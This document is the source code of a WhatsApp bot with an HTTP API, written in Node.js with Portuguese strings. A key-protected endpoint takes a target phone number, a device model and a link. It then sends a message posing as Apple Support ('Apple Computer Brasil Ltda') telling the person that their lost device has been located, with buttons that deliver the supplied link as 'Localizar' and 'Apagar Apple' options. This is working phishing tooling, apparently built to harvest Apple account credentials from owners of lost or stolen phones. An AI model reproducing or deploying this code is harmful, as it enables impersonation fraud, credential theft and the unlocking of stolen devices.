const express = require('express');
const app = express();
app.use(express.static('public'));
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, fetchLatestBaileysVersion, generateForwardMessageContent, prepareWAMessageMedia, generateWAMessageFromContent, generateMessageID, downloadContentFromMessage, makeInMemoryStore, MessageRetryMap} = require("@adiwajshing/baileys")

const pino = require('pino')
const fs = require('fs')
const chalk = require('chalk')
const fetch = require('node-fetch')
const FileType = require('file-type')
const { smsg, isUrl, generateMessageTag } = require('./util/myfunc')
const { banner } = require('./util/txtc')
const donoi = JSON.parse(fs.readFileSync('./util/settings.json'))
const setting = JSON.parse(fs.readFileSync('./util/settings.json'))
const axios = require('axios')
const color = (text, color) => { return !color ? chalk.green(text) : chalk.keyword(color)(text) }
const moment = require('moment-timezone')
const util = require('util')
async function reiniciarapi() {
    console.log(color('REINICIAMENTO PROGRAMADO...','red')), await process.exit()
}
setInterval(reiniciarapi, 7200000)



prefixoii = donoi.prefix
prefix = donoi.prefix


function sleep(ms) {
    return new Promise((resolve) => {
      setTimeout(resolve, ms);
    });
  }

class msgRetryCounterMap {
    MessageRetryMap = { }
    }

async function start() {
  const { version, isLatest } = await fetchLatestBaileysVersion()
        const { state, saveCreds } = await useMultiFileAuthState(`./qrcode.json`)
  console.log(chalk.keyword("green")("Iniciando APIZAP..."))
  const conn = makeWASocket({
      version: version,
      logger: pino({ level: 'silent' }),
      printQRInTerminal: true,
      browser: ['APIZAP','Safari','1.0.0'],
      auth: state,
      msgRetryCounterMap
  })

 


  conn.ev.on('messages.upsert', async ({ messages }) => {
      //console.log(JSON.stringify(chatUpdate, undefined, 2))
      try {
          const mek = messages ? messages[0]: messages[1]
          if (!mek.message) return 
          if (mek.message.protocolMessage) return 
          if (mek.key && mek.key.remoteJid == 'status@broadcast') return
      m = await smsg(conn, mek)
      const altpdf = Object.keys(m.message)
      const type = altpdf[0] == 'senderKeyDistributionMessage' ? altpdf[1] == 'messageContextInfo' ? altpdf[2] : altpdf[1] : altpdf[0]
      var body = (type === 'conversation') ? m.message.conversation : (type == 'imageMessage') ? m.message.imageMessage.caption : (type == 'videoMessage') ? m.message.videoMessage.caption : (type == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (type == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (type == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (type == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (type === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
      var budy = (type === 'conversation') ? m.message.conversation : (type === 'extendedTextMessage') ? m.message.extendedTextMessage.text : ''
      var bady = (type === 'conversation') ? m.message.conversation : (type == 'imageMessage') ? m.message.imageMessage.caption : (type == 'videoMessage') ? m.message.videoMessage.caption : (type == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.message.listResponseMessage && m.message.listResponseMessage.singleSelectReply.selectedRowId) ? m.message.listResponseMessage.singleSelectReply.selectedRowId : ''
      var prefix = setting.prefix
      const isCmd = body.startsWith(prefix)
      const command = isCmd ? body.slice(1).trim().split(/ +/).shift().toLocaleLowerCase() : null
      const time = moment.tz('America/Sao_Paulo').format('DD/MM HH:mm:ss')
      const args = body.trim().split(/ +/).slice(1)
      const pushname = m.pushName || "No Name"
      const itsMe = m.sender == conn.user.id ? true : false
      const text = q = args.join(" ")
      const c = args.join(' ')
      const botNumber = conn.user.id.split(':')[0] + '@s.whatsapp.net'
      const isBot = m.key.fromMe ? true : false
      const quoted = m.quoted ? m.quoted : m
      const mime = (quoted.m || quoted).mimetype || ''
      const isMedia = /image|video|sticker|audio/.test(mime)
      const sender = m.key.fromMe ? conn.user.id : m.key.remoteJid.endsWith('@g.us') ? m.key.participant : m.key.remoteJid
      const from = m.key.remoteJid
      const reply = m.reply
      let date = moment.tz('America/Sao_Paulo').format('DD')
      let month = moment.tz('America/Sao_Paulo').format('MM')
      let year = moment.tz('America/Sao_Paulo').format('YYYY')
      let hours = moment.tz('America/Sao_Paulo').format('HH')
      let minutes = moment.tz('America/Sao_Paulo').format('mm')
      let seconds = moment.tz('America/Sao_Paulo').format('ss')
      
      if(isBot) return

      const msjh = m.body
      if (msjh.includes('viewOnceMessage')) return console.log(chalk.black(chalk.red('[ MSG TEMPORARIA ]')), chalk.green("de " + m.sender.replace("@s.whatsapp.net", "")))
      await conn.readMessages([m.key])
      await conn.sendPresenceUpdate('available', m.chat)

     
//////////////////////////////////////////////////////////////////////

if(!isCmd) reply('*Comando inválido, selecione uma opção válida*')
      ////////////////////////////
      if (!m.isGroup && isCmd) console.log(chalk.black(chalk.green('[ CMD EM PV ]')), chalk.black(chalk.white(budy || type)), chalk.black(chalk.white("As " + hours + ":" + minutes + ":" + seconds + ",", "do dia " + date + "/" + month + "/" + year)) + '\n' + chalk.magenta('=> De'), chalk.green(pushname), chalk.yellow(m.sender.replace("@s.whatsapp.net", "")) + '\n' + chalk.blueBright('=> Em'), chalk.green(m.isGroup ? pushname : 'Pv', m.chat.replace("@s.whatsapp.net", "")))
      if (!m.isGroup && !isCmd) console.log(chalk.black(chalk.red('[ MSG EM PV ]')), chalk.black(chalk.white("As " + hours + ":" + minutes + ":" + seconds + ",", "do dia " + date + "/" + month + "/" + year)) + '\n' + chalk.magenta('=> De'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Em'), chalk.green(m.isGroup ? pushname : 'Pv', m.chat.replace("@s.whatsapp.net", "")))
      if (m.isGroup && isCmd) console.log(chalk.black(chalk.green('[ CMD EM GP ]')), chalk.black(chalk.white(budy || type)), chalk.black(chalk.white("As " + hours + ":" + minutes + ":" + seconds + ",", "do dia " + date + "/" + month + "/" + year)) + '\n' + chalk.magenta('=> De'), chalk.green(pushname), chalk.yellow(m.sender.replace("@s.whatsapp.net", "")) + '\n' + chalk.blueBright('=> Em'), chalk.green(m.isGroup ? pushname : 'Pv', m.chat.replace("@s.whatsapp.net", "")))
      if (m.isGroup && !isCmd) console.log(chalk.black(chalk.red('[ MSG EM GP ]')), chalk.black(chalk.white("As " + hours + ":" + minutes + ":" + seconds + ",", "do dia " + date + "/" + month + "/" + year)) + '\n' + chalk.magenta('=> De'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Em'), chalk.green(m.isGroup ? pushname : 'Pv', m.chat.replace("@s.whatsapp.net", "")))
      switch (command) {
                case 'iniciar':
                    
                    txtu = body.slice(9)
                
                linku = txtu.split("|")[0]
                if(!linku) return reply('Inicie pelo Menu')
                if(linku.length < 10) return reply('Inicie pelo Menu')

            
                
                    const buttonesi = [
                        {buttonId: `${prefix}localizar ${linku}`, buttonText: {displayText: 'Localizar'}, type: 1},
                        {buttonId: `${prefix}apagarapple ${linku}`, buttonText: {displayText: 'Apagar Apple'}, type: 1},
                        {buttonId: `${prefix}finalizarapple`, buttonText: {displayText: 'Finalizar atendimento'}, type: 1}
                        
                      ]
                    const buttonMessagei = {
                        text: `*MENU*`,
                        footer: 'Apple Computer Brasil Ltda',
                        buttons: buttonesi,
                        headerType: 4
                    }
                    await conn.sendMessage(from, buttonMessagei, { quoted: m})

                    break

                    case 'localizar':
                        txtc = body.slice(11)
                
                        linkc = txtc.split("|")[0]
                        if(!linkc) return reply('Inicie pelo Menu')
                        if(linkc.length < 10) return reply('Inicie pelo Menu')
        
                        reply(`Para visualizar a última localização do seu dispositivo Acesse: ${linkc}`)
                        break

                    case 'apagarapple':
                        txtcb = body.slice(13)
                
                        linkcb = txtcb.split("|")[0]
                        if(!linkcb) return reply('Inicie pelo Menu')
                        if(linkcb.length < 10) return reply('Inicie pelo Menu')
                        reply(`Para apagar seu dispositivo em modo perdido, Verifique em: ${linkcb}`)
                        break

                        case 'finalizarapple':
                            reply('Atendimento finalizado com sucesso, Apple agradeçe sua compreensão.')
                            break
            
            
            default:

                if (isCmd) {
                    reply('*Comando inválido, selecione uma opção válida*')
                   
                }
          }
              
      } catch (err) {
          console.log(err)
      }
  })

  conn.public = true

  conn.ev.on('connection.update', async (update) => {
      const { connection, lastDisconnect } = update
      
      if (connection === 'close') {
          lastDisconnect.error?.output?.statusCode !== DisconnectReason.loggedOut ? start() : console.log(chalk.red("╚» [!]"), chalk.keyword("red")("A Conexão caiu tentando Reconectar... ,"), chalk.yellow(`se não conectar execute o comando: sh reset.sh \n\n`)), sleep(10000).then(() => { process.exit(1) });

      }  else if(connection === 'open') {
          console.log(banner.string)
  console.log( chalk.magenta('\n'))
  
  console.log(chalk.green(" ╚» [!]"), chalk.keyword("green")("[ INFO ]"), chalk.yellow(`Conectado com Sucesso.`))

  console.log(chalk.green(" ╚» [!]"), chalk.keyword("green")("[ INFO ]"), chalk.yellow("Numero do Bot: " + conn.user.id.split(':')[0]))

  console.log(chalk.green(" ╚» [!]"), chalk.keyword("green")("[ INFO ]"), chalk.yellow(`Versão Whatsapp: WA v${version.join('.')}, Mais Recente: ${isLatest}`))

  console.log(chalk.green(" ╚» [!]"), chalk.keyword("green")("[ INFO ]"), chalk.yellow(`Seu Prefix: " ${prefixoii} " \n\n`))

console.log(chalk.magenta(" ╚» [!]"), chalk.keyword("magenta")("[ BOT ]"), chalk.yellow('Versão: APIZAP 1.0\n\n'))

      }
  })

  conn.ev.on('creds.update', saveCreds)

PORT = '8080'
app.set('trust proxy', 1);

app.use(express.urlencoded({ extended: true }));
app.use(express.json());


app.post('/api/enviarzap/:validacao/', (req, res) => {
  let validacao = req.params.validacao.toLowerCase() || '';
let num = req?.body?.numero
let modelo = req?.body?.modelo
let link = req?.body?.link

if(validacao !== "keysuprema") return res.status(403).json({error: 'Retorne a chave válida.' });
if(!num) return res.status(403).json({error: 'Insira o numero.' });
if(!modelo) return res.status(403).json({error: 'Insira o modelo.' });
if(!link) return res.status(403).json({error: 'Insira o link.' });

   
  const enviarnozap = async () => {
        
        numeropessoa = num.replace(/[^0-9]/g, '');
        if(numeropessoa.length < 11 || numeropessoa.length > 13) return res.status(400).json({error: 'Retorne um número valido' });
        if(!numeropessoa) return res.status(400).json({error: 'Retorne um Alvo' });
        const [result] = await conn.onWhatsApp(numeropessoa)
        if (!result?.exists) return res.status(400).json({error: 'Retorne um número valido' });             
                if(!modelo || modelo.length < 5) return res.status(400).json({error: 'Retorne um modelo' }); 
                 if(!link || link.length < 5) return res.status(400).json({error: 'Retorne um link' }); 
                
                const buttonesi = [
                        {buttonId: `${prefix}localizar ${link}`, buttonText: {displayText: 'Localizar'}, type: 1},
                        {buttonId: `${prefix}apagarapple ${link}`, buttonText: {displayText: 'Apagar Apple'}, type: 1},
                        {buttonId: `${prefix}finalizarapple`, buttonText: {displayText: 'Finalizar Atendimento'}, type: 1}
                        
                      ]
                    const buttonMessagei = {
                    image: fs.readFileSync("./img.jpg") ,
                    caption: `*Apple Suporte*
Prezado(a), Cliente Apple: seu dispositivo *${modelo}* em modo perdido emitiu uma localização e foi localizado com sucesso.`,
                      footer: 'Apple Computer Brasil Ltda',
                      buttons: buttonesi,
                      headerType: 4
                    }
                  try{
                  await conn.sendMessage(`${result.jid}`, buttonMessagei)
                  res.status(200).json({ok: 'Enviado com sucesso' });
                  } catch{ return res.status(400).json({error: 'Erro ao enviar mensagem verifique o numero se está com 9° digito' }); }                   
    
  }
  enviarnozap()
 

 
  
});



app.get('/', (req, res) => {
  res.status(404).send(
    "<h1>Page not found on the server</h1>");

});

app.set('json spaces', 4);

app.use((req, res, next) => {
    res.status(404).send(
        "<h1>Page not found on the server</h1>")
})

app.listen(PORT, () => {
  console.log(`Aplicativo rodando em: http://192.168.28.4:${PORT}`);
  
});
}
start()
